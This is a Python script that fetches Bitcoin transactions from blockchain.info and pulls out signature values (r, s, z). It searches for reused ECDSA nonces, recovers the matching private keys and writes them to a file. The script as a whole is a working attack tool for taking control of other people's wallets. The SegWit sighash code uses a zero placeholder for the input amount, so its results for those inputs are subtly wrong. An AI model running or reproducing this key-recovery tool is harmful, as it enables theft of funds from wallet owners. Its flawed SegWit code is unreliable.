import sys
import os
import binascii
import argparse
from urllib.request import urlopen
import hashlib
import base58
from sympy import mod_inverse

# CRYPTOGRAPHYTUBE
parser = argparse.ArgumentParser(description="[+] Find reused R values within or across Bitcoin transactions.", epilog="[+] CRYPTOGRAPHYTUBE \n")
parser.add_argument("-txids", nargs='+', help="Enter one TXID, multiple TXIDs separated by spaces, or a single filename.txt", required=True)
args = parser.parse_args()

# CRYPTOGRAPHYTUBE
def getRaw(txid):
    try:
        print(f"[+] Fetching raw transaction for: {txid[:30]}...")
        html = urlopen("https://blockchain.info/rawtx/%s?format=hex" % txid, timeout=20)
        return html.read().decode('utf-8')
    except Exception as e:
        print(f"[!] ERROR: Could not fetch raw transaction for {txid}. Reason: {e}")
        return None

# CRYPTOGRAPHYTUBE
def toBin(HEX):
    return binascii.unhexlify(HEX)

# CRYPTOGRAPHYTUBE
def tohash160(pub_bin):
    sha256_hash = hashlib.sha256(pub_bin).digest()
    ripemd160 = hashlib.new('ripemd160')
    ripemd160.update(sha256_hash)
    return ripemd160.digest()

# CRYPTOGRAPHYTUBE
def dblsha256(binHex):
    return hashlib.sha256(hashlib.sha256(binHex).digest()).hexdigest()

# CRYPTOGRAPHYTUBE
def get_der_sig_rs(der_sig):
    try:
        r_len = int(der_sig[6:8], 16)
        r = der_sig[8 : 8 + r_len*2]
        s_marker_pos = 8 + r_len*2
        s_len = int(der_sig[s_marker_pos+2 : s_marker_pos+4], 16)
        s = der_sig[s_marker_pos+4 : s_marker_pos+4 + s_len*2]
        return r, s
    except:
        return '', ''

# CRYPTOGRAPHYTUBE
def parse_varint(tx_hex, cursor):
    b = int(tx_hex[cursor:cursor+2], 16)
    cursor += 2
    if b < 0xfd:
        return b, cursor
    elif b == 0xfd:
        val = int.from_bytes(toBin(tx_hex[cursor:cursor+4]), 'little')
        cursor += 4
        return val, cursor
    elif b == 0xfe:
        val = int.from_bytes(toBin(tx_hex[cursor:cursor+8]), 'little')
        cursor += 8
        return val, cursor
    else:
        val = int.from_bytes(toBin(tx_hex[cursor:cursor+16]), 'little')
        cursor += 16
        return val, cursor

# CRYPTOGRAPHYTUBE
def encode_varint(i):
    if i < 0xfd:
        return i.to_bytes(1, 'little').hex()
    elif i <= 0xffff:
        return "fd" + i.to_bytes(2, 'little').hex()
    elif i <= 0xffffffff:
        return "fe" + i.to_bytes(4, 'little').hex()
    else:
        return "ff" + i.to_bytes(8, 'little').hex()

# CRYPTOGRAPHYTUBE
def parsingRaw(txRaw):
    version = txRaw[:8]
    is_segwit = txRaw[8:12] == '0001'
    cur = 12 if is_segwit else 8

    tx_in_count, cur = parse_varint(txRaw, cur)
    
    inputs = []
    for _ in range(tx_in_count):
        prev_txid = txRaw[cur:cur+64]
        cur += 64
        prev_out_index = int.from_bytes(toBin(txRaw[cur:cur+8]), 'little')
        cur += 8
        script_sig_len, cur = parse_varint(txRaw, cur)
        script_sig = txRaw[cur:cur + 2*script_sig_len]
        cur += 2*script_sig_len
        sequence = txRaw[cur:cur+8]
        cur += 8
        inputs.append({'prev_txid': prev_txid, 'prev_out_index': prev_out_index, 'script_sig': script_sig, 'sequence': sequence})

    tx_out_count, cur = parse_varint(txRaw, cur)
    outputs = []
    for _ in range(tx_out_count):
        value = txRaw[cur:cur+16]
        cur += 16
        script_pubkey_len, cur = parse_varint(txRaw, cur)
        script_pubkey = txRaw[cur:cur+2*script_pubkey_len]
        cur += 2*script_pubkey_len
        outputs.append({'value': value, 'script_pubkey': script_pubkey})
    
    witnesses = []
    if is_segwit:
        for _ in range(tx_in_count):
            witness_count, cur = parse_varint(txRaw, cur)
            witness_items = []
            for _ in range(witness_count):
                item_len, cur = parse_varint(txRaw, cur)
                item = txRaw[cur:cur+2*item_len]
                cur += 2*item_len
                witness_items.append(item)
            witnesses.append(witness_items)
            
    locktime = txRaw[cur:cur+8]
    
    final_inputs = []
    for i, inp in enumerate(inputs):
        inp_data = {'type': 'unknown', 'r': '', 's': '', 'pub': '', 'addr': '', 'input_index': i}
        inp_data.update(inp)

        if is_segwit and i < len(witnesses):
            witness = witnesses[i]
            if len(witness) == 2:
                sig_with_sighash, pub_hex = witness[0], witness[1]
                sig_hex = sig_with_sighash[:-2] if len(sig_with_sighash) > 2 else sig_with_sighash
                inp_data['pub'] = pub_hex
                inp_data['r'], inp_data['s'] = get_der_sig_rs(sig_hex)
                if inp['script_sig'] == '':
                    inp_data['type'] = 'p2wpkh'
                    inp_data['addr'] = pub_to_bech32_addr(pub_hex)
                else:
                    inp_data['type'] = 'p2sh-p2wpkh'
                    inp_data['addr'] = pub_to_p2sh_p2wpkh_addr(pub_hex)
            elif len(witness) > 2:
                inp_data['type'] = 'p2wsh'
                witness_script_hex = witness[-1]
                script_hash = hashlib.sha256(toBin(witness_script_hex)).digest()
                inp_data['addr'] = bech32_encode('bc', [0] + list(convertbits(script_hash, 8, 5, True)))
        elif not is_segwit and inp['script_sig']:
            try:
                sig_len_with_sighash = int(inp['script_sig'][0:2], 16)
                sig_with_sighash = inp['script_sig'][2:2+sig_len_with_sighash*2]
                sig_hex = sig_with_sighash[:-2]
                pub_len_pos = 2+sig_len_with_sighash*2
                pub_len = int(inp['script_sig'][pub_len_pos:pub_len_pos+2], 16)
                pub_hex = inp['script_sig'][pub_len_pos+2:pub_len_pos+2+pub_len*2]
                
                inp_data['type'] = 'p2pkh'
                inp_data['pub'] = pub_hex
                inp_data['r'], inp_data['s'] = get_der_sig_rs(sig_hex)
                inp_data['addr'] = pub_to_p2pkh_addr(pub_hex)
            except:
                pass
        final_inputs.append(inp_data)
        
    return [version, locktime, final_inputs, outputs]

# CRYPTOGRAPHYTUBE
def getrsz(pars, txid):
    version, locktime, inputs, outputs = pars
    result = []
    
    for x in range(len(inputs)):
        inp = inputs[x]
        z, sighash_preimage_hex = '', ''
        
        if inp['type'] in ['p2wpkh', 'p2sh-p2wpkh']:
            prevouts_hex = "".join([i['prev_txid'] + i['prev_out_index'].to_bytes(4, 'little').hex() for i in inputs])
            sequence_hex = "".join([i['sequence'] for i in inputs])
            outputs_hex = "".join([o['value'] + encode_varint(len(toBin(o['script_pubkey']))) + o['script_pubkey'] for o in outputs])
            hash_prevouts = dblsha256(toBin(prevouts_hex))
            hash_sequence = dblsha256(toBin(sequence_hex))
            hash_outputs = dblsha256(toBin(outputs_hex))
            value_placeholder = "0000000000000000"
            script_code = '1976a914' + binascii.hexlify(tohash160(toBin(inp['pub']))).decode() + '88ac'
            sighash_preimage_hex = (version + hash_prevouts + hash_sequence +
                                    inp['prev_txid'] + inp['prev_out_index'].to_bytes(4, 'little').hex() +
                                    script_code + value_placeholder + inp['sequence'] +
                                    hash_outputs + locktime + "01000000")
            z = dblsha256(toBin(sighash_preimage_hex))
        
        elif inp['type'] == 'p2pkh':
            tx_in_count_hex = encode_varint(len(inputs))
            sighash_preimage_hex = version + tx_in_count_hex
            for i in range(len(inputs)):
                sighash_preimage_hex += inputs[i]['prev_txid'] + inputs[i]['prev_out_index'].to_bytes(4, 'little').hex()
                if x == i:
                    script_code = '76a914' + binascii.hexlify(tohash160(toBin(inp['pub']))).decode() + '88ac'
                    sighash_preimage_hex += encode_varint(len(toBin(script_code))) + script_code
                else:
                    sighash_preimage_hex += '00'
                sighash_preimage_hex += inputs[i]['sequence']
            
            tx_out_count_hex = encode_varint(len(outputs))
            sighash_preimage_hex += tx_out_count_hex
            for o in outputs:
                 sighash_preimage_hex += o['value'] + encode_varint(len(toBin(o['script_pubkey']))) + o['script_pubkey']
            sighash_preimage_hex += locktime + "01000000"
            z = dblsha256(toBin(sighash_preimage_hex))
        
        result.append({'r': inp['r'], 's': inp['s'], 'z': z, 'pub': inp['pub'], 
                       'addr': inp['addr'], 'type': inp['type'], 'txid': txid, 'input_index': inp['input_index']})
    return result

# CRYPTOGRAPHYTUBE
def pub_to_p2pkh_addr(pub_hex):
    return base58.b58encode_check(b'\x00' + tohash160(toBin(pub_hex))).decode('utf-8')

# CRYPTOGRAPHYTUBE
def pub_to_p2sh_p2wpkh_addr(pub_hex):
    redeem_script = b'\x00\x14' + tohash160(toBin(pub_hex))
    return base58.b58encode_check(b'\x05' + tohash160(redeem_script)).decode('utf-8')

# CRYPTOGRAPHYTUBE
CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"
def pub_to_bech32_addr(pub_hex):
    pubkey_hash = tohash160(toBin(pub_hex))
    return bech32_encode('bc', [0] + list(convertbits(pubkey_hash, 8, 5)))

def convertbits(data, frombits, tobits, pad=True):
    acc, bits, ret, maxv = 0, 0, [], (1 << tobits) - 1
    for value in data:
        acc = (acc << frombits) | value
        bits += frombits
        while bits >= tobits:
            bits -= tobits
            ret.append((acc >> bits) & maxv)
    if pad and bits > 0: ret.append((acc << (tobits - bits)) & maxv)
    return ret

def bech32_polymod(values):
    GEN = [0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3]
    chk = 1
    for v in values:
        b = chk >> 25
        chk = (chk & 0x1ffffff) << 5 ^ v
        for i in range(5): chk ^= GEN[i] if ((b >> i) & 1) else 0
    return chk

def bech32_hrp_expand(s):
    return [ord(x) >> 5 for x in s] + [0] + [ord(x) & 31 for x in s]

def bech32_encode(hrp, data):
    checksum = bech32_polymod(bech32_hrp_expand(hrp) + data + [0, 0, 0, 0, 0, 0]) ^ 1
    return hrp + '1' + ''.join([CHARSET[d] for d in data + [(checksum >> 5 * (5 - i)) & 31 for i in range(6)]])

# CRYPTOGRAPHYTUBE
def recover_private_key(R, S1, S2, Z1, Z2):
    n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
    k = ((Z1 - Z2) * mod_inverse(S1 - S2, n)) % n
    d = (((S1 * k) - Z1) * mod_inverse(R, n)) % n
    return hex(d)

# CRYPTOGRAPHYTUBE
txid_list = []
potential_txids = args.txids
if len(potential_txids) == 1 and potential_txids[0].endswith('.txt'):
    filename = potential_txids[0]
    print(f"[+] Reading TXIDs from file: {filename}")
    if not os.path.exists(filename):
        print(f"[!] ERROR: File not found: {filename}"); sys.exit(1)
    with open(filename, 'r') as f:
        txid_list = [line.strip() for line in f if line.strip()]
else:
    txid_list = potential_txids

print("[+] Starting the program ... ")
all_inputs_data = []
for txid in txid_list:
    rawtx = getRaw(txid)
    if rawtx:
        parsed_data = parsingRaw(rawtx)
        input_details = getrsz(parsed_data, txid)
        all_inputs_data.extend(input_details)

print("\n[+] Displaying all collected input data...")
current_txid = ""
for i, inp in enumerate(all_inputs_data):
    if inp['txid'] != current_txid:
        if len(txid_list) > 1:
            print(f"\n--- Transaction: {inp['txid']} ---")
        current_txid = inp['txid']
    print('=' * 50)
    print(f"[+] Input No: {inp['input_index']} ({inp['type'].upper()})")
    print(f"  R: {inp['r']}")
    print(f"  S: {inp['s']}")
    print(f"  Z: {inp['z']}")
    print(f"  PubKey: {inp['pub']}")
    print(f"  Address: {inp['addr']}")

print("\n[+] Starting cross-comparison of all inputs...")
private_key_found = False
warned_pairs = set()

for i in range(len(all_inputs_data)):
    for j in range(i + 1, len(all_inputs_data)):
        input1 = all_inputs_data[i]
        input2 = all_inputs_data[j]
        
        if input1['r'] and input1['r'] == input2['r']:
            pair = tuple(sorted((f"{input1['txid']}-{input1['input_index']}", f"{input2['txid']}-{input2['input_index']}")))
            if pair in warned_pairs:
                continue

            if input1['pub'] and input1['pub'] == input2['pub']:
                print("\n" + "="*70)
                print(f"[+] MATCH FOUND: Reused R value with matching Public Key!")
                print(f"  - TX 1: {input1['txid']} (Input #{input1['input_index']})")
                print(f"  - TX 2: {input2['txid']} (Input #{input2['input_index']})")
                print(f"  - Addr: {input1['addr']}")
                print("[+] Attempting to recover private key...")
                try:
                    pk = recover_private_key(int(input1['r'], 16), int(input1['s'], 16), int(input2['s'], 16), int(input1['z'], 16), int(input2['z'], 16))
                    print(f"[+] Private Key FOUND: {pk}")
                    with open("found_private_keys.txt", "a") as f:
                        f.write(f"Address: {input1['addr']}\n")
                        f.write(f"Private Key: {pk}\n")
                        f.write(f"Source TX 1: {input1['txid']} (Input {input1['input_index']})\n")
                        f.write(f"Source TX 2: {input2['txid']} (Input {input2['input_index']})\n\n")
                    private_key_found = True
                except Exception as err:
                    print(f"[!] Could not recover private key: {err}")
                print("="*70)
            else:
                print("\n" + "-"*70)
                print(f"[!] WARNING: Reused R value detected, but Public Keys do NOT match.")
                print(f"  - TX 1: {input1['txid']} (Input #{input1['input_index']})")
                print(f"  - TX 2: {input2['txid']} (Input #{input2['input_index']})")
                print("[!] Private key cannot be recovered from this pair.")
                print("-"*70)
            
            warned_pairs.add(pair)

print("\n[+] Comparison finished.")
if not private_key_found:
    print("[+] No reused R values with matching Public Keys were found.")
print("[+] Program Completed")
print("\nCreated by: CRYPTOGRAPHYTUBE")
